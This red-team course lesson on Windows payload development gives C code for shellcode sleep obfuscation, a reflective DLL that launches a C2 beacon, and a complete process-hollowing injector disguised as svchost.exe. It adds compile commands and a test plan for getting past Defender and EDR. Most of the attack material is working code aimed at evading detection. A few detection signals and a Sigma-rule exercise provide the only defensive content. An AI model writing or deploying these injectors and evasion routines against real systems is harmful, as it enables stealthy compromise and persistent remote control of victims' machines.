---
title: "Payload Development — Shellcode Runners, Reflective DLL, Process Hollowing"
tags: [red-team, payload, shellcode-runner, reflective-DLL, process-hollowing,
  C, windows, evasion]
module: 08-RedTeam-01
day: 496
related_topics:
  - Evasion Lab (Day 495)
  - Post-Exploitation Advanced (Day 497)
  - AV and EDR Evasion Concepts (Day 494)
  - Binary Exploitation Fundamentals (Days 366–430)
---

# Day 496 — Payload Development

> "A tool you downloaded is a tool the blue team has already seen.
> A tool you wrote is a tool they may not have a signature for.
> You do not need to reinvent the wheel — but you need to understand
> how the wheel works so you can change the shape when detection catches up."
>
> — Ghost

---

## Goals

Understand and implement three payload delivery mechanisms: shellcode runner,
reflective DLL injection, and process hollowing.
Understand the OpSec trade-offs of each approach.
Connect payload delivery to C2 implants from Day 493.

**Prerequisites:** Day 495 (evasion lab), Day 494 (evasion concepts), C programming,
Windows API fundamentals.
**Time budget:** 6 hours.

---

## Part 1 — The Payload Delivery Problem

A payload is the code you want to run on the victim. Delivery is how you get
it to execute, stay resident, and phone home — without a process named
`beacon.exe` appearing in the process list.

### The Three Approaches

| Technique | Where payload lives | Process name visible | Disk artefact |
|---|---|---|---|
| Shellcode runner | Heap/stack of runner process | `runner.exe` visible | Yes (runner binary) |
| Reflective DLL | Memory of target process | Target process name only | Optional |
| Process hollowing | Replaced executable section of hollow process | Looks like any legitimate process | No new process |

---

## Part 2 — Shellcode Runner (Advanced Version)

The shellcode runner from Day 495 was functional. This version adds:
- **Sleep API obfuscation** (avoids memory scans during sleep)
- **Indirect syscalls** (bypasses userland hooks)
- **Heap encryption** (C2 shellcode encrypted in memory between check-ins)

### Sleep Obfuscation via HeapEncrypt + APC Sleep

Standard implants sleep with `Sleep()`. During sleep, the EDR scans process
memory and finds the shellcode in the heap.

```c
// Encrypted sleep: encrypt heap before sleep, decrypt after waking
// Concept: Ekko, Zzzz, or Foliage sleep obfuscation

// Simplified implementation:
void encrypted_sleep(DWORD ms, PBYTE shellcode_buf, SIZE_T sc_len, BYTE key) {
    // 1. Encrypt the shellcode buffer in-place
    for (SIZE_T i = 0; i < sc_len; i++) shellcode_buf[i] ^= key;

    // 2. Change memory protection to RW (no longer executable)
    DWORD old;
    VirtualProtect(shellcode_buf, sc_len, PAGE_READWRITE, &old);

    // 3. Sleep
    Sleep(ms);

    // 4. Restore protection and decrypt
    VirtualProtect(shellcode_buf, sc_len, PAGE_EXECUTE_READ, &old);
    for (SIZE_T i = 0; i < sc_len; i++) shellcode_buf[i] ^= key;
}
```

**Effect:** During the sleep period, the shellcode in memory is non-executable
and XOR-encrypted. Memory scanners that look for shellcode patterns or
PAGE_EXECUTE regions will not find it.

---

## Part 3 — Reflective DLL Injection

Reflective DLL injection loads a DLL directly from memory — without calling
`LoadLibrary()`. The DLL contains its own loader stub that resolves imports
and adjusts relocations without touching the Windows loader.

### How It Works

```
Normal DLL loading:
  LoadLibrary("beacon.dll") → Windows loader reads from disk → maps into memory

Reflective DLL loading:
  Allocate memory in target process
  Write the DLL bytes into that memory
  Call the DLL's reflective loader function
  → The reflective loader parses the PE headers itself
  → Resolves all imports using GetProcAddress manually
  → Applies base relocations manually
  → Calls DllMain with DLL_PROCESS_ATTACH
  → DllMain starts the beacon
```

### Building a Reflective DLL

```c
// beacon_dll.c — the payload DLL
// Must include ReflectiveDLLInjection loader stub (open source):
// https://github.com/stephenfewer/ReflectiveDLLInjection

#include "ReflectiveLoader.h"

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // Start beacon thread
        CreateThread(NULL, 0, beacon_main, NULL, 0, NULL);
    }
    return TRUE;
}

DWORD WINAPI beacon_main(LPVOID lpParam) {
    // C2 beacon logic: connect, receive commands, execute
    // Using Sliver shellcode or custom C2 protocol
    return 0;
}
```

```bash
# Compile as position-independent DLL
x86_64-w64-mingw32-gcc -o beacon.dll beacon_dll.c ReflectiveLoader.c \
    -shared -e ReflectiveLoader \
    -Wl,--enable-stdcall-fixup
```

### Injection of Reflective DLL

```c
// inject_rdll.c — loads beacon.dll into target process reflectively
// Read DLL bytes from file or embed directly
// VirtualAllocEx + WriteProcessMemory: still fires Sysmon Event 10
// CreateRemoteThread(addr_of_ReflectiveLoader): fires Sysmon Event 8
// -- same detection surface as classic injection --
// But: no LoadLibrary call → no Windows loader → no module in InLoadOrderModuleList
// → DLL is invisible to tools that enumerate loaded modules via the PEB
```

**OpSec advantage:** The injected DLL does not appear in module enumeration
(`pslist`, `lsass` module list). This defeats simple "list loaded DLLs" detection.

---

## Part 4 — Process Hollowing

Process hollowing creates a legitimate process in a suspended state, unmaps
its original code, maps the payload in its place, and resumes the thread.
The process appears legitimate to the OS process list.

```c
// hollow.c — process hollowing
#include <windows.h>
#include <winternl.h>

// Step 1: Create target process in suspended state
STARTUPINFOA si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);
CreateProcessA("C:\\Windows\\System32\\svchost.exe",   // "hollow" this process
               NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED,     // ← suspended — not running yet
               NULL, NULL, &si, &pi);

// Step 2: Read target's image base from PEB
// PEB is at TEB+0x60 on x64; ImageBaseAddress at PEB+0x10
// Use NtQueryInformationProcess to get PEB address:
PROCESS_BASIC_INFORMATION pbi;
NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                          &pbi, sizeof(pbi), NULL);
LPVOID peb_base = pbi.PebBaseAddress;
LPVOID img_base;
ReadProcessMemory(pi.hProcess, (PVOID)((ULONG_PTR)peb_base + 0x10),
                  &img_base, sizeof(img_base), NULL);

// Step 3: Unmap the original executable
NtUnmapViewOfSection(pi.hProcess, img_base);

// Step 4: Allocate memory at same base address and write payload
LPVOID new_base = VirtualAllocEx(pi.hProcess, img_base,
                                  payload_size,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, new_base, payload_bytes, payload_size, NULL);

// Step 5: Update PEB's ImageBaseAddress to point to new payload
WriteProcessMemory(pi.hProcess, (PVOID)((ULONG_PTR)peb_base + 0x10),
                   &new_base, sizeof(new_base), NULL);

// Step 6: Update thread context — set RIP to payload's entry point
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = (DWORD64)new_base + payload_ep_offset;  // entry point RVA
SetThreadContext(pi.hThread, &ctx);

// Step 7: Resume the thread — the process now runs the payload
ResumeThread(pi.hThread);
```

**OpSec advantage:** Process list shows `svchost.exe`, not any malicious name.
Process parent is whatever launched the hollow process.

**Detection signals:**
- NtUnmapViewOfSection on a freshly-created process (unusual).
- Image base in PEB does not match file on disk (Sysmon Event 25 on some EDRs).
- Thread context RIP set to an unusual address before first instruction.

---

## Part 5 — Choosing the Right Technique

```
Situation                              Recommended technique
─────────────────────────────────────────────────────────────
Initial access, file dropped          Shellcode runner + XOR + sleep obfuscation
Lateral movement target               Reflective DLL injection into target process
Long-term persistence, stealth        Process hollowing of a legitimate service
Post-exploitation command execution   Beacon task queue (no new process)
Bypassing module enumeration          Reflective DLL (PEB not updated)
High-noise environment (advanced SOC) Direct syscall + APC + sleep obfuscation
```

---

## Part 6 — Compile and Test Checklist

```bash
# Cross-compile all payloads on Kali for Windows:
# Shellcode runner:
x86_64-w64-mingw32-gcc -o runner.exe runner.c -lws2_32 -mwindows

# Reflective DLL:
x86_64-w64-mingw32-gcc -o beacon.dll beacon_dll.c ReflectiveLoader.c \
    -shared -e ReflectiveLoader

# Hollow process injector:
x86_64-w64-mingw32-gcc -o hollow.exe hollow.c -lntdll

# Test sequence on Windows VM:
# 1. Disable Defender real-time for baseline test (measure behaviour)
# 2. Check which processes appear in Task Manager / Process Explorer
# 3. Enable Defender — test which techniques survive static + dynamic detection
# 4. Check Sysmon — compare event logs for each technique
```

---

## Key Takeaways

1. Shellcode runners are the simplest delivery mechanism. Sleep obfuscation
   significantly reduces detectability during the idle period.
2. Reflective DLL injection hides from module enumeration (PEB not updated).
   It still fires Sysmon Event 10 for memory allocation and write operations.
3. Process hollowing produces a process list entry with a legitimate name.
   Detection relies on PEB inconsistencies and unusual thread context setup —
   a gap in many default EDR configurations.
4. Payload development is a balance between capability and operational risk.
   Always test the specific technique against the target EDR before relying on it.
5. Write your own payloads. Downloaded tools have known signatures. Custom
   implementations delay detection until the pattern is learned.

---

## Exercises

1. Implement the encrypted sleep technique. Confirm with Sysmon that no
   PAGE_EXECUTE region exists during the sleep window.
2. Build a reflective DLL that starts a Sliver beacon when injected. Inject it
   into `explorer.exe`. Verify: (a) the C2 connection comes from `explorer.exe`,
   and (b) the DLL does not appear in Process Explorer's module list.
3. Implement process hollowing targeting `svchost.exe`. Run a simple payload
   that pops a message box. Observe Sysmon Event 1 (Process Create) — what is
   the parent process? What is the command line?
4. Write a Sigma rule that detects process hollowing based on the combination
   of NtUnmapViewOfSection + NtWriteVirtualMemory + NtResumeThread on the same
   target PID within 5 seconds.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q496.1, Q496.2 …).

---

## Navigation

← Previous: [Day 495 — Evasion Lab](DAY-0495-Evasion-Lab.md)
→ Next: [Day 497 — Post-Exploitation Advanced](DAY-0497-Post-Exploitation-Advanced.md)
